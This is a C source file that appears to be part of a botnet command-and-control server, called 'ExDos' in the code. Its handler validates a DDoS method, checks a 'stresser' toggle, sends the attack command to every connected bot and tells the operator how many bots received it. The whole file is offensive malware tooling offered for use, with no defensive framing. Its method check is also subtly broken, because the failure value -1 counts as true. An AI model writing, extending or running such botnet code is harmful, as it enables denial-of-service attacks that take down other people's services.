#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "../commands.h"

const int DDOS_CMD_ARGS           = 4;
const int DDOS_CMD_RANK_LEVEL     = 1;

int IsMethodValid(char *m) {
    for(int i = 0; i < count_arr((char **)METHODS); i++) {
        if(!strcmp(METHODS[i], m))
            return 1;
    }

    return -1;
}

void ddos_attk(ExDos *x, Client *c, str *cmd, Arr *Args) {
    ClearScreen(((Client *)c)->sock);
    if(Args->arr[0] == NULL || !IsMethodValid(Args->arr[0]))
        return;

    if(!((ExDos *)x)->AttackToggle) {    
        str *x_pos = string("11");
        str *y_pos = string("22");
        str *buff = string("Error, Unable to send attack right now.\nStresser is disabled");
        list_text(((Client *)c)->sock, x_pos, y_pos, buff);
        free(x_pos);
        free(y_pos);
        free(buff);
        return;
    }

    cmd->AppendString(cmd, "\n");

    /* Send command to all bots */
    int i = 0;
    for(i = 0; i < (long)((uArray *)((ExDos *)x)->online_bots)->idx; i++) {
        Write((Socket *)((Bot *)((uArray *)((ExDos *)x)->online_bots)->arr[i])->socket, cmd);
    }

    str *aresp = string("Attack Sent to ");
    char *bot_count = int2ch(i);
    aresp->AppendString(aresp, bot_count);
    aresp->AppendString(aresp, " bots");
    str *x_pos = string("11");
    str *y_pos = string("35");
    place_text(((Client *)c)->sock, string("11"), string("35"), aresp);
    free(x_pos);
    free(y_pos);
    free(aresp);
    free(bot_count);
}